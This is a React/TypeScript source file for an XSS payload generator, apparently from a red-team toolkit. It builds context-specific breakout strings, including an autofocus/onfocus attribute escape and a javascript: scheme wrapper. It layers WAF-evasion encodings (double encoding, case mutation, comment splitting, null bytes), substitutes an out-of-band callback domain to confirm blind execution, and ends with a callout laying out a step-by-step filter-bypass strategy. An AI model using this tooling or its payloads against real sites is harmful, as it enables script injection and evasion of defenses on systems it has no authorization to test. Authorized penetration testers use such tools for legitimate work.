import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CopyChip,
  DownloadButton,
  KVTable,
  SectionTitle,
  Select,
  Tabs,
  TextInput,
} from '@/components/ui';
import { XSS_TEMPLATES } from '@/lib/redteam-data';
import { DEFAULT_OOB_DOMAIN } from '@/tools/registry';

type Context = 'html' | 'attr-dq' | 'attr-sq' | 'js' | 'url' | 'json';
type Variant = 'raw' | 'entity' | 'url' | 'double' | 'unicode' | 'case' | 'comment' | 'null';

const CONTEXTS: Array<{ value: Context; label: string; hint: string }> = [
  { value: 'html', label: 'HTML body', hint: 'Reflected between tags — the payload is injected verbatim' },
  { value: 'attr-dq', label: 'Attribute (double-quoted)', hint: 'value="{{X}}" — break out with a double quote' },
  { value: 'attr-sq', label: 'Attribute (single-quoted)', hint: "value='{{X}}' — break out with a single quote" },
  { value: 'js', label: 'JavaScript string', hint: "var x='{{X}}' — escape the quote then run code" },
  { value: 'url', label: 'URL / href', hint: 'href="{{X}}" — javascript: or data: scheme' },
  { value: 'json', label: 'JSON value', hint: 'Template placeholder evaluated inside a JS object literal' },
];

const BROWSERS = [
  { value: 'all', label: 'All browsers' },
  { value: 'chromium', label: 'Chromium (V8)' },
  { value: 'firefox', label: 'Firefox (SpiderMonkey)' },
  { value: 'webkit', label: 'Safari / WebKit' },
  { value: 'legacy', label: 'Legacy / IE-era parsers' },
] as const;

const BROWSER_HINTS: Record<string, string> = {
  all: 'Every template is emitted — filtered below only by variant selection.',
  chromium: 'Drops <a href=javascript:> (blocked by CSP-less navigation guard on some builds) and legacy </xmp> parsing tricks.',
  firefox: 'Drops <math><mtext><mglyph> parser-confusion chains; keeps setTimeout string sinks.',
  webkit: 'Keeps <details ontoggle> and <video><source onerror>, drops the mglyph confusion chain.',
  legacy: 'Keeps mutation-XSS and </xmp> parsing tricks; drops srcdoc and template-literal payloads.',
};

const VARIANT_ORDER: Variant[] = ['raw', 'entity', 'url', 'double', 'unicode', 'case', 'comment', 'null'];

const VARIANT_INFO: Record<Variant, { label: string; note: string; apply: (p: string) => string }> = {
  raw: { label: 'Raw', note: 'Baseline payload with no encoding.', apply: (p) => p },
  entity: {
    label: 'HTML entity',
    note: 'Decimal entities on every < > " \' & — survives filters that only block literal angle brackets.',
    apply: (p) => p.replace(/[<>"'&]/g, (c) => `&#${c.charCodeAt(0)};`),
  },
  url: {
    label: 'URL-encoded',
    note: 'encodeURIComponent() — the encoding a query-string reflector will decode once.',
    apply: (p) => encodeURIComponent(p),
  },
  double: {
    label: 'Double-encoded',
    note: 'Two rounds of percent encoding — defeats single-pass normalisers and some WAFs.',
    apply: (p) => encodeURIComponent(encodeURIComponent(p)),
  },
  unicode: {
    label: 'Unicode-escaped',
    note: '\\uXXXX for every character — lands inside JS string contexts that decode escapes.',
    apply: (p) => Array.from(p, (c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''),
  },
  case: {
    label: 'Case-mutated',
    note: 'Alternating case on tag names and event handlers — regex filters are usually case-sensitive.',
    apply: (p) =>
      p.replace(/(script|onerror|onload|svg|img|alert|iframe|details|ontoggle)/gi, (m) =>
        Array.from(m, (c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase())).join(''),
      ),
  },
  comment: {
    label: 'Comment-split',
    note: 'Splits keywords with /**/ and inserts an HTML comment inside the tag — breaks naive token matching.',
    apply: (p) =>
      p
        .replace(/<script>/gi, '<scr<!-- -->ipt>')
        .replace(/alert/gi, 'ale/**/rt')
        .replace(/onerror/gi, 'on/**/error'),
  },
  null: {
    label: 'Null-byte',
    note: 'Injects %00 after the first opening bracket — truncates C-string style filters.',
    apply: (p) => {
      const at = p.search(/[<"']/);
      const idx = at < 0 ? 0 : at + 1;
      return p.slice(0, idx) + '%00' + p.slice(idx);
    },
  },
};

function browserFilter(ctx: Context, browser: string, tpl: string): boolean {
  if (browser === 'all') return true;
  const isJsScheme = /javascript:/i.test(tpl);
  const isMglyph = /mglyph/i.test(tpl);
  const isXmp = /<\/xmp>/i.test(tpl);
  const isSrcdoc = /srcdoc/i.test(tpl);
  const isTemplate = /\{\{|\$\{/.test(tpl);
  if (browser === 'chromium') return !(isJsScheme && ctx === 'html') && !isXmp;
  if (browser === 'firefox') return !isMglyph;
  if (browser === 'webkit') return !isMglyph;
  if (browser === 'legacy') return !isSrcdoc && !isTemplate;
  return true;
}

/** Wrap the raw template so it actually breaks out of the chosen context. */
function contextualise(ctx: Context, tpl: string): string {
  switch (ctx) {
    case 'attr-dq':
      return tpl.includes('"') ? `"${tpl}` : `" autofocus onfocus=alert(document.domain) x="`;
    case 'attr-sq':
      return tpl.includes("'") ? `'${tpl}` : `' autofocus onfocus=alert(document.domain) x='`;
    case 'js':
      return /^['"`]/.test(tpl) ? tpl : `';${tpl}//`;
    case 'url':
      return /^javascript:/i.test(tpl) ? tpl : `javascript:${tpl}`;
    case 'json':
      return tpl.replace(/"/g, '\\"');
    default:
      return tpl;
  }
}

export default function XssPayloadGenerator() {
  const [ctx, setCtx] = useState<Context>('html');
  const [browser, setBrowser] = useState<string>('all');
  const [oast, setOast] = useState(DEFAULT_OOB_DOMAIN);
  const [selected, setSelected] = useState<Variant[]>(['raw', 'entity', 'url', 'double']);
  const [view, setView] = useState<Variant>('raw');

  const groups = useMemo(() => {
    const host = oast.trim() || DEFAULT_OOB_DOMAIN;
    const base = XSS_TEMPLATES.map((t) => t.replace(/OAST_DOMAIN/g, host)).filter((t) =>
      browserFilter(ctx, browser, t),
    );
    return VARIANT_ORDER.filter((v) => selected.includes(v)).map((v) => ({
      variant: v,
      label: VARIANT_INFO[v].label,
      items: base.map((t) => VARIANT_INFO[v].apply(contextualise(ctx, t))),
    }));
  }, [ctx, browser, oast, selected]);

  const total = groups.reduce((n, g) => n + g.items.length, 0);
  const active = groups.find((g) => g.variant === view) ?? groups[0];
  const activeCtx = CONTEXTS.find((c) => c.value === ctx)!;

  const toggle = (v: Variant, on: boolean) =>
    setSelected((prev) => {
      const next = on ? [...prev, v] : prev.filter((x) => x !== v);
      if (!next.includes(view) && next.length) setView(next[0]);
      return next;
    });

  const download = groups
    .map((g) => [`# variant: ${g.label}`, ...g.items, ''].join('\n'))
    .join('\n');

  return (
    <>
      <Card title="Context & filters">
        <div className="grid gap-4 sm:grid-cols-2">
          <Select
            label="Injection context"
            value={ctx}
            onChange={setCtx}
            options={CONTEXTS.map((c) => ({ value: c.value, label: c.label }))}
            hint={activeCtx.hint}
          />
          <Select
            label="Browser filter"
            value={browser}
            onChange={setBrowser}
            options={BROWSERS.map((b) => ({ value: b.value, label: b.label }))}
            hint={BROWSER_HINTS[browser]}
          />
          <TextInput
            label="OAST domain"
            value={oast}
            onChange={setOast}
            mono
            placeholder={DEFAULT_OOB_DOMAIN}
            hint="Substituted for OAST_DOMAIN — <img src=//host/p.png> confirms blind execution"
          />
        </div>
        <div className="mt-4">
          <SectionTitle>Encoding variants</SectionTitle>
          <div className="grid gap-2.5 sm:grid-cols-2 lg:grid-cols-4">
            {VARIANT_ORDER.map((v) => (
              <Checkbox
                key={v}
                checked={selected.includes(v)}
                onChange={(on) => toggle(v, on)}
                label={VARIANT_INFO[v].label}
                description={VARIANT_INFO[v].note}
              />
            ))}
          </div>
        </div>
      </Card>

      <Card
        title="Payload corpus"
        action={
          <div className="flex items-center gap-2">
            <span className="rf-mono rounded bg-[var(--neutral-btn)] px-2 py-0.5 text-[12px] text-[var(--accent)]">
              {total} payloads
            </span>
            <DownloadButton text={download} filename="xss-corpus.txt" label="Download .txt" />
          </div>
        }
      >
        {groups.length === 0 ? (
          <Callout tone="info" title="Nothing selected">
            Pick at least one encoding variant to build the corpus.
          </Callout>
        ) : (
          <>
            <Tabs
              value={active.variant}
              onChange={setView}
              tabs={groups.map((g) => ({ value: g.variant, label: g.label, badge: g.items.length }))}
            />
            <div className="mt-3 flex flex-col gap-1.5">
              {active.items.map((p, i) => (
                <div key={i} className="flex items-center gap-2 rounded border border-[var(--card-border)] px-2 py-1">
                  <span className="w-6 shrink-0 text-right text-[11px] text-[var(--text-faint)]">{i + 1}</span>
                  <CopyChip text={p} />
                </div>
              ))}
            </div>
          </>
        )}
      </Card>

      <Card title="Transform summary">
        <KVTable
          rows={[
            ['Context', activeCtx.label],
            ['Breakout', contextualise(ctx, '<PAYLOAD>')],
            ['Browsers', BROWSERS.find((b) => b.value === browser)!.label],
            ['OAST host', oast.trim() || DEFAULT_OOB_DOMAIN],
            [
              'Transforms applied',
              selected.length
                ? selected.map((v) => VARIANT_INFO[v].label).join(' → ')
                : 'none',
            ],
          ]}
        />
        <div className="mt-4">
          <Callout tone="warn" title="WAF-bypass strategy">
            Layer transforms in order: <strong>comment-split</strong> breaks keyword regexes, <strong>case-mutate</strong>{' '}
            beats case-sensitive rules, <strong>entity / unicode</strong> push the decode step into the victim parser, and{' '}
            <strong>double-encoding</strong> survives a single normalisation pass. Send each tab's corpus as a separate
            request batch and diff the response size — a 200 with the same body length as the blocked variant usually
            means the filter decoded it once more than the sink.
          </Callout>
        </div>
      </Card>
    </>
  );
}
